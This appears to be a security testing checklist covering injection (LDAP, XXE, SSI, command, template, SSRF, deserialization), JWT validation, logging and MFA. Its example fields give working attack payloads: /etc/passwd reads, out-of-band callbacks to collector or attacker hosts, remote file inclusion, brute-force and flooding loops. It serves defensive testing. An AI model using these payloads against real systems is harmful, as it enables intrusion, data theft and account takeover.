pre: Do not run on production.
steps: Find inputs used to build an LDAP search filter, such as a username or search box.
Send a wildcard character and LDAP metacharacters and compare the responses.
Try an authentication bypass with a filter-closing payload in the username and password fields.
tests.ex: Search: user=* ; Login bypass: user=*)(uid=*))(|(uid=* , pass=password
tests.exp: The application escapes LDAP metacharacters in every filter and rejects an always-true filter.

tests.title: Test XML input for XML injection and malformed structure attacks
tests.obj: Finds XML parsers that fail to neutralize metacharacters supplied in element values.
pre: Do not run on production.
steps: Find an endpoint or form that accepts data later placed into an XML document.
Submit single and double quotes inside an XML attribute value.
Submit angle brackets, a CDATA closing sequence and an unescaped ampersand inside an element value.
Check if the resulting document is malformed or if content is misplaced.
tests.ex: Username = foo' ; Username = foo<!-- ; CDATA breakout: ]]> ; unescaped ampersand: Username = &foo
tests.exp: The application escapes or rejects XML metacharacters and the document structure cannot be changed by input.

tests.title: Test XML parser configuration for XXE and billion-laughs attacks
tests.obj: Finds XML parsers that resolve external entities or expand nested entities without limits.
pre: Do not run on production.
steps: Submit an XML document with a DOCTYPE that defines an external entity pointing to a local file.
Observe whether the response discloses the file content.
If no direct output exists, use an out-of-band DOCTYPE pointing to a collector host and watch for a callback.
Submit a nested entity expansion payload and monitor server memory and CPU.
tests.ex: <!DOCTYPE user [ <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><user>&xxe;</user> ; OOB: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://collaborator-host/collect">%xxe;]> ; billion laughs nested <!ENTITY> chain
tests.exp: The parser disables DOCTYPE declarations and external entity resolution and limits entity expansion.

tests.title: Test server-side includes for SSI injection
tests.obj: Finds pages that interpret user input as a server-side include directive.
pre: Do not run on production.
steps: Determine whether the web server supports SSI, for example .shtml pages.
Find inputs including headers and cookies that are reflected into SSI-processed pages.
Submit an echo directive to read a server variable.
Submit an exec directive to request operating system command output.
tests.ex: Referer: <!--#exec cmd="/bin/ps ax"--> ; <!--#echo var="DOCUMENT_NAME" -->
tests.exp: SSI directives in user input are neutralized and the exec directive is disabled on the server.

tests.title: Test XPath queries for injection and authentication bypass
tests.obj: Finds XPath queries built by concatenating untrusted login or search input.
pre: Do not run on production.
steps: Find an input placed into an XPath expression, such as a login form backed by an XML store.
Submit an always-true boolean payload in the username and password fields.
Observe whether the application authenticates or returns data without valid credentials.
tests.ex: Username: ' or '1' = '1 ; Password: ' or '1' = '1
tests.exp: The application binds values to the XPath query instead of concatenating them and rejects the always-true payload.

tests.title: Test webmail parameters for IMAP or SMTP command injection
tests.obj: Finds webmail front ends that pass unescaped input into IMAP or SMTP commands.
pre: Do not run on production.
steps: Identify parameters used to build IMAP or SMTP commands, such as mailbox or message ID.
Submit a double quote and other special characters in the parameter.
Submit a CRLF sequence followed by a second command to test command injection.
tests.ex: https://webmail/src/view_header.php?mailbox=INBOX%22&passed_id=1 ; message_id=1 BODY[HEADER]%0d%0aV100 CAPABILITY%0d%0a
tests.exp: IMAP and SMTP special characters and CRLF sequences are rejected or escaped before use in a mail command.

tests.title: Test for code injection through dynamic code evaluation
tests.obj: Finds features that execute user-supplied code through eval or an include statement.
pre: Do not run on production.
steps: Find inputs that are used in an include, require, eval or similar execution construct.
Submit a benign code snippet and check for its effect in the response.
If execution is confirmed, submit a safe command to show code execution.
tests.ex: ASP code injection input: Request("Data") written to data.txt then Server.Execute("data.txt"); PHP eval probe: 7*7 to confirm execution, then a benign system command
tests.exp: User input never reaches eval, include or an equivalent dynamic execution function.

tests.title: Test file inclusion parameters for local and remote file inclusion
tests.obj: Finds include or require calls that build a path from user input without validation.
pre: Do not run on production.
steps: Find a parameter that selects a file to include or preview.
Submit a path traversal sequence to read a local file outside the intended directory.
Append a null byte or known truncation technique if an extension is appended server-side.
If outbound connections are allowed, submit a URL to test remote file inclusion.
Test PHP wrapper payloads such as php://filter and data:// if the backend is PHP.
tests.ex: https://target/preview.php?file=../../../../etc/passwd ; php://filter/convert.base64-encode/resource=config.php ; https://target/vuln.php?file=https://attacker/malicious
tests.exp: File and URL parameters are resolved against an allowlist of safe paths with no path traversal or remote URL.

tests.title: Test operating system command injection in server functions
tests.obj: Finds application features that pass untrusted input into an OS command without sanitization.
pre: Do not run on production.
steps: Find features that call the operating system, such as file conversion, ping or diagnostic tools.
Append a command separator and a benign command to the input.
Try alternative separators and command substitution if the first payload is filtered.
If no output is returned, use an out-of-band callback to show blind execution.
tests.ex: Doc=Doc1.pdf | Dir c:\ ; input|/bin/ls ; ;cat /etc/passwd ; $(whoami) ; `whoami` ; OOB: ; curl http://collaborator-host
tests.exp: The application avoids calling OS commands with user input, or uses parameterized execution APIs with an allowlist of commands and arguments.

tests.title: Test string formatting functions for format string injection
tests.obj: Finds code that passes user input directly as the format argument of a printf-family function.
pre: Do not run on production.
steps: Find inputs that may reach a format function, for example logging of a username.
Submit conversion specifiers such as %s and %n in the input.
Observe for an application error, crash, or information disclosure in the response.
tests.ex: https://target/userinfo?username=%25s%25s%25s%25n
tests.exp: User input is never passed as the format argument of a format function; it is passed only as a data argument.

tests.title: Test for incubated vulnerabilities that need a recall step
tests.obj: Finds stored injection that only triggers when a later action recalls the planted data.
pre: Do not run on production.
steps: Identify features that store attacker data for later use, such as uploads, forum posts or report generation.
Plant a stored XSS or SQL payload that fires on a later recall, such as an admin viewing a report.
Trigger or wait for the recall step and confirm the planted payload executes.
tests.ex: Bulletin post: then wait for an admin to view the post
tests.exp: Stored input is sanitized at write time and encoded at every later recall point, so the planted payload never executes.

tests.title: Test reflected response headers for HTTP response splitting
tests.obj: Finds user input reflected into a response header without CRLF filtering.
pre: Do not run on production.
steps: Find a parameter reflected into a Location or Set-Cookie header, often through a redirect.
Submit a CRLF sequence followed by a forged header and body in the parameter.
Check if the response is split into two messages by an intermediary cache or browser.
tests.ex: interface=advanced%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>injected</html>
tests.exp: CR and LF characters are stripped or rejected before user input is placed into any response header.

tests.title: Test front-end and back-end servers for HTTP request smuggling
tests.obj: Finds parsing mismatches between Content-Length and Transfer-Encoding across proxy layers.
pre: Do not run on production.
steps: Send a CL.TE probe request with conflicting Content-Length and chunked Transfer-Encoding.
Send a TE.CL probe request with the chunk size mismatched to the Content-Length.
Send an obfuscated Transfer-Encoding header to test TE.TE desynchronization.
Observe whether a following legitimate request is corrupted or routed unexpectedly.
tests.ex:
CL.TE: Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x ; Burp Suite HTTP Request Smuggler extension
tests.exp: The front-end and back-end agree on request boundaries and no smuggled request is ever processed.

tests.title: Test Host header handling for injection and cache poisoning
tests.obj: Finds server logic that trusts the Host or X-Forwarded-Host header for routing or link generation.
pre: Do not run on production.
steps: Send a request with the Host header set to an attacker domain and observe the response.
If filtered, retry using the X-Forwarded-Host header.
Trigger password reset functionality with a tampered Host header and check the link in the email.
Send a poisoned Host header to a cacheable page and request the same page again from another session.
tests.ex: Host: www.attacker.com ; X-Forwarded-Host: www.attacker.com ; password reset request with Host: www.attacker.com
tests.exp: The server uses a fixed, server-side configured hostname and ignores the Host header value for links and cache keys.

tests.title: Test template rendering for server-side template injection
tests.obj: Finds templating engines that evaluate expressions built from untrusted input.
pre: Do not run on production.
steps: Find inputs rendered through a template engine, such as a greeting or report field.
Submit a generic arithmetic probe such as {{7*7}} and check if it is evaluated.
Identify the template engine from the response and research its built-in functions.
Build a proof-of-concept remote code execution payload for the identified engine.
tests.ex: Probe: a{{7*7}}b or ${7*7} or <%= 7*7 %> ; Flask/Jinja2: curl -g 'https://target/page?name={{7*7}}' returns Hello 49
tests.exp: Untrusted input is never concatenated into template source; it is passed only as template data with escaping enabled.

tests.title: Test server-initiated requests for SSRF
tests.obj: Finds server functions that fetch a URL supplied by the client without restriction.
pre: Do not run on production.
steps: Find a feature that fetches a URL on the server, such as a webhook, PDF generator or import tool.
Submit a URL pointing to the loopback address or an internal hostname.
Submit alternative IP encodings if plain loopback addresses are blocked.
Submit a file:// URL to test for local file disclosure.
tests.ex: http://127.0.0.1/admin ; http://2130706433/ ; http://017700000001/ ; http://127.0.0.2/ ; file:///etc/passwd ; iframe src=file:///etc/passwd in PDF generator input
tests.exp: Outbound requests are restricted to an allowlist of domains, ports and protocols and loopback and link-local addresses are blocked.

tests.title: Test object binding endpoints for mass assignment
tests.obj: Finds auto-binding frameworks that let a client set fields never exposed in the form.
pre: Do not run on production.
steps: Identify endpoints that create or update an object from submitted parameters.
Retrieve the full object representation to learn hidden or sensitive field names.
Add a sensitive field such as isAdmin or role to the create or update request.
Observe whether the sensitive field value is accepted and persisted.
tests.ex: POST /createUser username=bob&password=x&email=bob@test&isAdmin=true ; probe field user[nonexistingattribute] for autobinding behavior
tests.exp: The backend binds only an explicit allowlist of fields; extra client-supplied fields are ignored.

tests.title: Test spreadsheet export for CSV and formula injection
tests.obj: Finds exported CSV files where a cell beginning with a formula character is evaluated by spreadsheet software.
pre: Do not run on production.
steps: Identify export features that place untrusted input into CSV, such as reports or audit logs.
Enter a value beginning with =, +, -, @, tab or carriage return in an exportable field.
Export the file and open it in Excel and in LibreOffice.
Save and reopen the file in Excel to check the mitigation survives a round trip.
tests.ex: =1+1 ; +1+1 ; @SUM(1,1) ; =HYPERLINK("http://example.invalid/leak?test=1","Click Me") ; separator breakout then =1+1
tests.exp: No exported cell is interpreted as a formula in Excel or LibreOffice, including after an Excel save and reopen.

tests.title: Test JSON-accepting endpoints for prototype pollution
tests.obj: Finds recursive merge or clone code that lets attacker keys modify Object.prototype.
pre: Do not run on production.
steps: Find JSON endpoints that merge, clone or extend a user-supplied object into application state.
Submit a body containing a __proto__ or constructor.prototype key with a marker value.
For client-side code, submit the marker through the URL hash or query string.
Check whether the marker value is now present on a brand-new object.
tests.ex: {"name":"test","__proto__":{"polluted":"yes"}} ; URL probe: https://target/#__proto__[testpolluted]=reflected ; then evaluate ({}).testpolluted in the console
tests.exp: Merge and clone functions reject or strip __proto__, constructor and prototype keys before assignment.

tests.title: Test cookies and API inputs for insecure deserialization
tests.obj: Finds entry points that deserialize untrusted Java, PHP, Python pickle, Node or .NET serialized objects.
pre: Do not run on production.
steps: Inspect cookies, hidden fields and API bodies for serialization markers such as rO0, O:4:, or a .NET binary header.
Identify the serialization format and library version in use.
Submit a non-destructive out-of-band probe, such as ysoserial URLDNS, to confirm deserialization.
If a type-metadata field such as @class or @type is accepted, flag it as high priority.
tests.ex: Cookie rememberMe=rO0ABXNy... ; java -jar ysoserial.jar URLDNS http://collaborator-host/ ; JSON probe {"@class":"com.example.Exploit"}
tests.exp: The application never deserializes untrusted data, or restricts it to an allowlist of safe types with integrity checking.

tests.title: Check that the token signature is validated
tests.obj: Finds services that accept tokens with a wrong or missing signature.
steps: Decode a valid token and change one claim.
Send the changed token with the old signature.
Send a token with the signature removed.
Send a token signed with a different key.
tests.ex: jwt_tool <JWT> -M pb -t https://target/api/me -rh 'Authorization: Bearer JWT' (playbook scan of signature checks)
tests.exp: The service rejects every token with an invalid or missing signature.

tests.title: Check the algorithm allowlist and the none algorithm
tests.obj: Finds acceptance of unsigned tokens or algorithms the service did not choose.
steps: Read the code or configuration for the list of allowed algorithms.
Send a token with alg set to none, in several letter cases.
Send a token with an algorithm that is not on the list.
Make sure the list holds either symmetric or asymmetric algorithms.
tests.ex: jwt_tool <JWT> -X a -t https://target/api/me -rh 'Authorization: Bearer JWT'
tests.exp: Only allowed algorithms are used for each context. The none algorithm is never accepted.

tests.title: Check for key type confusion between symmetric and asymmetric keys
tests.obj: Finds services that accept a token made with the public key as a shared secret.
pre: Test environment preferred.
steps: Find out if the service expects an RS or ES algorithm.
Read the code: make sure the key type is bound to one algorithm.
Send a token with an HS algorithm in a test environment.
Look at the library version and known issues.
tests.ex: jwt_tool <JWT> -X k -pk public.pem -t https://target/api/me -rh 'Authorization: Bearer JWT'
tests.exp: The service binds each key to one algorithm. A token with a different key type is rejected.

tests.title: Check that key material comes only from trusted sources
tests.obj: Finds services that take the verification key from header values that the sender controls.
pre: Test environment.
steps: Read the code that selects the key.
Make sure the jwk, jku and x5u headers are ignored or checked against an allowlist.
Make sure the kid value is validated before any file or database lookup.
Send a token with a changed header value in a test environment and look at the result.
tests.ex: jwt_tool <JWT> -X s (spoofed JWKS) against a test instance; grep -rn 'jku\|x5u\|getKey\|kid' src/
tests.exp: Keys come from pre-configured sources of the issuer. Header values cannot add new key sources.

tests.title: Check the expiry and not-before claims
tests.obj: Finds tokens that are accepted outside their validity time.
steps: Read the exp and nbf claims of a token.
Send the token after exp.
Send a token with nbf in the future.
Check the lifetime: it must fit the application.
tests.ex: jwt_tool <JWT> -T to edit exp; or wait for expiry and call curl -H 'Authorization: Bearer <JWT>' https://target/api/me
tests.exp: Expired tokens and tokens that are not yet valid are rejected. Token lifetime is short.

tests.title: Check that the service accepts only the right token type
tests.obj: Finds services that accept an ID token as an access token, or the reverse.
steps: Get an ID token, an access token and a refresh token.
Send the ID token to an API that needs an access token.
Send an access token where an ID token is needed.
Check the typ header and the validation rules in the code.
tests.ex: curl -H 'Authorization: Bearer <ID token>' https://target/api/me
tests.exp: Each service accepts only the token type and purpose that it is made for.

tests.title: Check the audience claim at each service
tests.obj: Finds tokens for one service that work at another service.
steps: Log in to a low-privilege app and read the aud claim.
Send the same token to another service or API.
Check that the allowlist of audiences exists in the service.
If one key serves many audiences, check that aud names each one.
tests.ex: curl -H 'Authorization: Bearer <token for client-portal>' https://internal-admin.example.com/api/v1/users
tests.exp: A service accepts only tokens whose audience names that service. Tokens for one audience fail at another.

tests.title: Check the issuer claim and the key set for each issuer
tests.obj: Finds services that accept tokens from the wrong issuer or environment.
steps: Read the iss claim of a token.
Send a token from a staging or other tenant issuer to production.
Read the code: make sure the key set is chosen by the checked issuer.
Make sure missing iss or aud claims are rejected.
tests.ex: jwt_tool <JWT> to read iss and aud; replay a staging token at the production API.
tests.exp: Only tokens from the configured issuer are accepted, checked with its own keys.

tests.title: Check for weak HMAC secrets
tests.obj: Finds short, default or guessable signing secrets.
pre: A token from a test account. Offline work only.
steps: Look for default signing keys in the product and its documentation.
Test the token against a wordlist of common secrets offline.
Read the secret length and the way it is made.
Make sure each audience and issuer has its own secret.
tests.ex: hashcat -m 16500 jwt.txt rockyou.txt ; jwt_tool <JWT> -C -d wordlist.txt
tests.exp: The HMAC secret is random, at least as long as the hash output, and not shared between issuers or audiences.

tests.title: Check the JWT payload for sensitive data
tests.obj: Finds tokens that expose passwords, hashes or personal data.
steps: Decode the payload of each token type.
List every claim.
Mark claims with sensitive data.
If tokens must hold sensitive data, check for JWE and a fixed algorithm pair.
tests.ex: jwt_tool <JWT> ; echo '<payload>' | base64 -d | jq .
tests.exp: The payload holds no secrets or unneeded personal data. Signed tokens are treated as readable by anyone.

tests.title: Check how the JWT is stored and sent
tests.obj: Finds tokens sent over HTTP or kept where scripts can read them.
steps: Make sure all calls that carry the token use HTTPS.
If the token is in a cookie, check the cookie attributes.
Look for tokens in localStorage, URLs and logs.
tests.ex: DevTools > Application > Storage; ZAP passive scan for tokens in URLs.
tests.exp: Tokens travel only over HTTPS. Cookies have Secure, HttpOnly and SameSite. Tokens are not in URLs or logs.

tests.title: Check revocation and logout for self-contained tokens
tests.obj: Finds JWTs that stay valid after logout, role change or account removal.
steps: Log in and save the token. Log out.
Send the saved token.
Disable the account or change the role. Send the token again.
Read how the service handles revocation: deny list, status list or short life.
tests.ex: curl -i -H 'Authorization: Bearer <old JWT>' https://target/api/me after POST /logout.
tests.exp: After logout and account changes the old token is rejected. A revocation method exists and token lifetime is short.

tests.title: Check the JWT library version and signature edge cases
tests.obj: Finds libraries with known signature validation flaws.
steps: List the JWT libraries and runtime versions.
Look up known issues for each version.
Test ECDSA tokens with invalid signature values on Java runtimes in the affected range.
Update libraries that have issues.
tests.ex: npm audit ; pip-audit ; dependency-check --scan . ; java -version
tests.exp: Libraries and runtimes are current and have no known signature issues.

tests.title: Check JWE use and compression settings if tokens are encrypted
tests.obj: Finds weak encryption settings in encrypted tokens.
steps: Find tokens with five parts.
Read the alg and enc header values.
Make sure only an allowlisted pair is accepted.
Make sure the zip header is not used.
tests.ex: jwt_tool <JWE> ; grep -rn 'zip' src/ | grep -i jwe
tests.exp: Only allowlisted alg and enc pairs are used. Keys are bound to one algorithm and claims are not compressed.

tests.title: Review the logging inventory for each layer of the stack
tests.obj: Find layers with unknown logging, storage, access rules or retention.
steps: Ask for the logging inventory.
Check that it lists layers, events, formats, storage, use, access control and retention time.
Compare the inventory with real log sources on a test system.
tests.ex: Document review; find /var/log -type f -mtime -1; list log groups with aws logs describe-log-groups
tests.exp: A current inventory exists for each layer and matches the real log sources.

tests.title: Make sure each log entry has the who, when, where and what
tests.obj: Find log entries that cannot support an investigation.
steps: Trigger a login, a failed access and a data change.
Read the log entries for each.
Check that they show time, source, user, action, object and result.
Check that the entries can be linked by a request or session ID.
tests.ex: grep -E 'login|denied' /var/log/app/app.log | tail -5
tests.exp: Each security log entry has time, place, user, action and outcome. Entries can be correlated.

tests.title: Check log time sources and time zone in timestamps
tests.obj: Find logging components with unsynchronized clocks or timestamps without a time zone.
steps: Check the time sync source (NTP or chrony) on every logging component.
Compare the clock offset between components.
Check that log timestamps use UTC or show the offset.
tests.ex: chronyc tracking; timedatectl; grep -m3 -E '[0-9]{4}-[0-9]{2}-[0-9]{2}T' app.log
tests.exp: Clocks are in sync and log timestamps use UTC or an explicit offset.

tests.title: Make sure logs go only to the documented files and services
tests.obj: Find logs that are written or sent to places outside the inventory.
steps: List all log files and log targets that the application uses.
Check network connections for log traffic to unknown hosts.
Compare them with the inventory.
tests.ex: lsof -p <pid> | grep -E 'log|\.out'; ss -tnp | grep <pid>
tests.exp: The application writes and sends logs only to the documented targets.

tests.title: Make sure logs use a common format that the processor reads
tests.obj: Find log formats that the processor cannot parse or correlate.
steps: Look at the format of logs from each component.
Check that the log processor parses them without errors.
Check that the event names follow a shared vocabulary.
tests.ex: jq . app.log | head; check parser error counts in the SIEM
tests.exp: Logs follow a common format, parse without errors, and can be correlated.

tests.title: Make sure logs hold no credentials, tokens or protected personal data
tests.obj: Find passwords, session IDs, tokens and card data in logs.
steps: Send requests with test passwords, tokens, card numbers and personal data.
Search the log files and the log platform for these test values.
Check that session tokens are hashed or masked, and that debug logs hold no secrets.
Check that logging failures do not show debug data to users.
tests.ex: grep -rEn 'password=|Authorization: Bearer|[0-9]{13,16}' /var/log/app/; trufflehog filesystem /var/log/app
tests.exp: Logs follow the rules for each data level. They hold no passwords, secrets, tokens or full card numbers.

tests.title: Make sure all authentication events are logged
tests.obj: Find login, logout, MFA and reset events that leave no log.
steps: Do a successful login, failed logins, a locked account and an MFA failure.
Do a password reset and a password change.
Read the logs for each event.
Check for authentication type and factors in the entries.
tests.ex: grep -E 'authn_|login' /var/log/app/security.log
tests.exp: All successful and failed authentication operations are logged with the method used.

tests.title: Make sure failed authorization events are logged
tests.obj: Find access denials that leave no trace.
steps: Request another user's object and an admin function with a low-privilege account.
Read the log for each denial.
For L3, check that sensitive data access is logged without the data itself.
tests.ex: curl -si -H 'Cookie: session=LOW' https://example.com/admin/users; tail -n 20 /var/log/app/security.log
tests.exp: Each failed authorization creates a log entry with user and resource.

tests.title: Make sure security events and control bypass tries are logged
tests.obj: Find attacks on validation, business logic and anti-automation that leave no log.
steps: Send invalid input, tampered tokens, out-of-order workflow steps and repeated rapid requests.
Read the logs for each try.
Check that the events in the security documentation are all logged.
Check that the logs hold high-risk actions such as admin actions and data export.
tests.ex: zap-baseline.py -t https://example.com ; then count related entries in the security log
tests.exp: Security events and tries to bypass controls are logged with enough context to start an investigation.

tests.title: Make sure unexpected errors and security control failures are logged
tests.obj: Find errors and failed controls, such as backend TLS failures, that nobody sees.
steps: Force an unhandled error with bad input.
Break a backend TLS connection in a test system.
Read the log for both events.
Check that the log has the cause but no secrets.
tests.ex: curl -s 'https://example.com/?id=%00' ; tail -n 20 /var/log/app/error.log
tests.exp: Unexpected errors and control failures create log entries with the cause and without secrets.

tests.title: Test log injection and make sure logging components encode data
tests.obj: Find user input that can forge or break log lines.
steps: Send input with CRLF, JSON quotes, and log format fields in parameters, headers and user names.
Read the log for forged lines or broken structure.
Check that the log viewer escapes HTML and other control characters.
tests.ex: curl -s 'https://example.com/login' -d $'user=admin\r\n2026-01-01 INFO login success user=admin&pass=x'
tests.exp: Logging encodes user input. An attacker cannot add or change log entries.

tests.title: Make sure logs are protected from unauthorized access and change
tests.obj: Find logs that unauthorised users can read, change or delete.
steps: Check file and storage permissions of the log files and log platform.
Try to read, edit and delete a log entry with a normal service account.
Check for append-only, write-once or hash chain protection.
Check that web access to log files is blocked.
tests.ex: ls -l /var/log/app/; lsattr /var/log/app/*; curl -si https://example.com/logs/app.log
tests.exp: Only authorized roles can read logs. Nobody can change them. Web access is blocked.

tests.title: Make sure logs are sent securely to a separate system
tests.obj: Find logs that stay on the host an attacker can reach.
steps: Find the log shipping configuration.
Check that the transport uses TLS and that the target is a separate system with other credentials.
Delete a local log in a test system and check that the remote copy stays.
Check that the pipeline gives alerts and escalation.
tests.ex: cat /etc/rsyslog.d/*.conf | grep -E '@@|tls'; filebeat test output
tests.exp: Logs go over TLS to a logically separate system. Local tampering does not change the remote copy.

tests.title: Check that attacks create alerts and that responders get them
tests.obj: Find monitoring that does not detect or escalate active attacks.
pre: Do not run on production without approval of the SOC.
steps: Run a scan with ZAP or Burp against the test system, or a series of failed logins.
Look at whether alerts are created within the agreed time.
Check that alerts reach the people who respond, with a playbook.
Check the alert thresholds and the rate of false alarms.
Check that honeytoken access creates an alert, if used.
tests.ex: hydra -l admin -P short.txt example.com http-post-form '/login:u=^USER^&p=^PASS^:F=invalid'; then check the SIEM
tests.exp: Attacks and DAST scans create alerts. Responders receive them and follow a playbook.

tests.title: Check that MFA or several factors protect access
tests.obj: Finds single-factor access to the application, or MFA that uses the same factor twice.
steps: List the factors that the login needs.
Make sure at least two different factor types are needed, or approved single-factor combinations.
Check that two secrets of the same type, such as password plus PIN, are not counted as MFA.
For L3 systems, check that one factor is hardware-based and phishing resistant.
tests.ex: Burp history: record each login step; check that the session cookie is issued only after the second factor.
tests.exp: Access needs MFA or an approved combination of factors. Two factors of the same type do not count. L3 systems use a phishing-resistant hardware factor.

tests.title: Try to bypass MFA with other paths and headers
tests.obj: Finds login paths or flags that skip the second factor.
steps: List all login paths: main page, API, mobile API, federated login, test pages.
Log in with the password only. Request a protected page directly.
Call the API login endpoints with the password only.
Add X-Forwarded-For or debug headers such as X-Debug to the login.
Try a local login for an account that was linked to a federated login.
Try the hard-coded or break-glass account.
tests.ex: curl -i -b 'session=<pre-mfa cookie>' https://target/account ; curl -i -H 'X-Forwarded-For: 10.0.0.5' -H 'X-Debug: 1' -d 'u=a&p=b' https://target/api/login
tests.exp: Every login path needs the second factor. Headers, IP values and special accounts do not skip it.

tests.title: Test OTP brute force and rate limit
tests.obj: Finds OTP checks with no rate limit or lockout, so codes can be guessed.
pre: Test account that you can lock.
Do not run on production.
steps: Log in with the password and stop at the OTP page.
Send 100 wrong codes in a short time.
Check for lockout, delay or a new code requirement.
Check that a failure count follows the account and not only the IP address.
Send many codes from several IP addresses.
tests.ex: Burp Intruder: POST /mfa/verify code=§000000§ (numbers 000000-000200); look at status codes for a lockout.
tests.exp: The application limits wrong OTP codes per account, locks or delays, and logs the events. Longer codes or 64-bit entropy add safety.

tests.title: Check that OTPs, lookup secrets and TOTP work only once
tests.obj: Finds codes that can be reused.
steps: Log in and capture the valid OTP request.
Log out and log in again. Send the same code.
Replay the captured request at once.
Use a recovery code twice.
tests.ex: Burp Repeater: send POST /mfa/verify twice with the same code; the second request must fail.
tests.exp: Each lookup secret, out-of-band code and TOTP value works only once.

tests.title: Check the lifetime of OTP codes and TOTP
tests.obj: Finds codes that stay valid for too long.
steps: Request an out-of-band code.
Send it after 5, 10 and 11 minutes.
Send a TOTP value from 30, 60 and 90 seconds ago.
Request a new code and test the old one.
tests.ex: oathtool --totp -b $SECRET -N '-90 seconds' ; submit the value to /mfa/verify.
tests.exp: Out-of-band codes expire in 10 minutes or less. TOTP values are valid for 30 seconds or a small window. A new code cancels the old one.

tests.title: Check the generation and strength of OTPs and lookup secrets
tests.obj: Finds predictable or short codes, or weak TOTP seeds.
steps: Request 50 codes and examine them for patterns.
Check the code length: at least 20 bits (6 digits).
Read the code for the random function. It must be a CSPRNG.
Check that TOTP seeds come from a CSPRNG and are at least 160 bits.
tests.ex: grep -rn 'Math.random\|rand()\|random.randint' src/ ; Burp Sequencer on 50 OTPs.
tests.exp: Codes and seeds come from a CSPRNG and have enough entropy.

tests.title: Check the storage of lookup secrets
tests.obj: Finds recovery codes stored in clear text or with a fast hash.
steps: Find where recovery codes are stored.
Check the code entropy.
For secrets below 112 bits, check for a password hash with a 32-bit random salt.
Make sure OTP values are not in logs.
tests.ex: SELECT code FROM recovery_codes LIMIT 5; grep -rn 'recovery' src/ | grep -i hash
tests.exp: Lookup secrets under 112 bits are hashed with an approved password hash and salt. Codes are not logged.

tests.title: Check that out-of-band codes belong to one request
tests.obj: Finds codes that work for another login request or another user.
steps: Start two logins for the same user. Collect the code from the first.
Use the code of the first login in the second.
Use a code of user A in the login of user B.
tests.ex: Two Burp sessions: take code from mail 1 and POST it with the session cookie from login 2.
tests.exp: A code is bound to the original authentication request. It works only there.

tests.title: Check the use of SMS and phone calls as factors
tests.obj: Finds PSTN codes sent to unverified numbers, or with no stronger option.
steps: Add a phone number. Check that the application validates it.
Check that stronger factors such as TOTP are offered.
Look for a warning about the risks of SMS.
For L3 systems, check that SMS is not accepted.
tests.ex: POST /profile/phone number=+15550100 ; then check that no code goes out before validation.
tests.exp: PSTN codes go only to validated numbers. Stronger methods exist and the user sees a risk notice. L3 systems do not use PSTN.

tests.title: Check push MFA for flooding and number matching
tests.obj: Finds push MFA that lets an attacker flood the user until a prompt is accepted.
pre: Do not run on production.
steps: Log in with the password 10 times.
Count the push prompts that the user phone gets.
Check that the prompt shows context: place, device and time.
Check for number matching.
tests.ex: for i in $(seq 10); do curl -s -d 'u=victim&p=<pw>' https://target/login; done and count prompts on the test phone.
tests.exp: The application limits push requests, shows context, and uses number matching.

tests.title: Check that an authentication factor can be revoked
tests.obj: Finds lost or stolen factors that stay valid.
steps: Enrol a test device or token.
Revoke it in the profile or as administrator.
Try to log in with the revoked factor.
tests.ex: DELETE /api/mfa/devices/<id> then replay a code from that device.
tests.exp: A revoked factor cannot be used for authentication. The user is notified.

tests.title: Check that biometrics are only a second factor
tests.obj: Finds biometrics used alone.
steps: Read the authentication design.
Look for biometric login paths.
Try to log in with the biometric only.
tests.ex: Review the WebAuthn or app configuration: userVerification and the required factors per login.
tests.exp: Biometrics are used only together with something the user has or knows.

tests.title: Check the time source for TOTP checks
tests.obj: Finds TOTP checks that use the client time.
steps: Read the code that checks TOTP.
Send a client time or time zone value in the request.
Change the device clock. Test the code.
tests.ex: grep -rn 'totp' src/ | grep -i 'timestamp\|time(' ; add 'ts=<value>' to POST /mfa/verify.
tests.exp: The server uses its own trusted time source. Client time has no effect.

tests.title: Check the MFA recovery process and identity proof
tests.obj: Finds weak ways to regain access after a lost factor.
steps: Start the MFA recovery process.
Examine the proof of identity that the process needs.
Compare it with the proof at enrolment.
Test recovery codes: length, single use, brute-force limit and notice.
Look for security questions as a fallback.
tests.ex: Burp Intruder on POST /mfa/recovery code=§§ ; read the mail for the notice.
tests.exp: Recovery needs identity proof at the same level as enrolment. Recovery codes are strong, single use and rate limited. No weak fallback exists.

tests.title: Check that password reset does not bypass MFA
tests.obj: Finds reset flows that give access without the second factor.
steps: Enable MFA on a test account.
Reset the password with the email link.
Check if the application logs in the user without MFA.
Log in with the new password and check that MFA is still needed.
tests.ex: Complete /forgot -> /reset/confirm and call GET /account with the returned cookie.
tests.exp: Reset does not remove or skip MFA. The user still needs the second factor after the reset.

tests.title: Check the management of MFA settings
tests.obj: Finds MFA settings that can be changed without re-authentication, by CSRF or by IDOR.
steps: Disable MFA or change the device with a stolen session cookie only.
Send the change request from another site without a CSRF token.
Change the user ID in the request to another account.
Check for a notice to the user.
tests.ex: Burp Repeater: POST /account/mfa/disable with only the session cookie; then add user=victim.
tests.exp: Changes to MFA need a strong re-authentication, a CSRF token and ownership checks. The user gets a notice.

tests.title: Check trusted IP, location and certificate based factors
tests.obj: Finds factors that can be forged with headers or an unrestricted certificate authority.
steps: Set X-Forwarded-For to a trusted IP address.
List the trusted IP ranges: look for guest Wi-Fi and cloud ranges.
Check which CAs the server trusts for client certificates.
Use a certificate from another CA, and one issued to another user.
tests.ex: openssl s_client -connect target:443 | grep -A5 'Acceptable client certificate CA' ; curl -H 'X-Forwarded-For: 10.0.0.1' https://target/login
tests.exp: Header values do not set trust. Only reviewed ranges are trusted. Client certificates are accepted from approved CAs and only for the owner.

tests.title: Check OTP delivery abuse and SMS or email flooding
tests.obj: Finds missing limits on code sending, which allows harassment and cost abuse.
pre: Do not run on production.
steps: Request 20 codes for one account in one minute.
Check the number of messages sent.
Check that a new code cancels the old one.
Try the limit with different IP addresses.
tests.ex: for i in $(seq 20); do curl -s -o /dev/null -w '%{http_code}\n' -d 'user=victim' https://target/mfa/send; done
tests.exp: The number of codes per account and per time is limited. A new code replaces the old one.

tests.title: Check that tokens go only to components that need them
tests.obj: Finds access and refresh tokens exposed to browser code or other components.
steps: Map which components hold access and refresh tokens.
Look in browser storage and page scripts for tokens.
For browser apps, check whether a back-end-for-frontend keeps the tokens.
tests.ex: DevTools > Application > Storage; Burp: search the history for access_token and refresh_token.
tests.exp: Tokens are available only to the components that need them. Browser code does not hold refresh tokens.

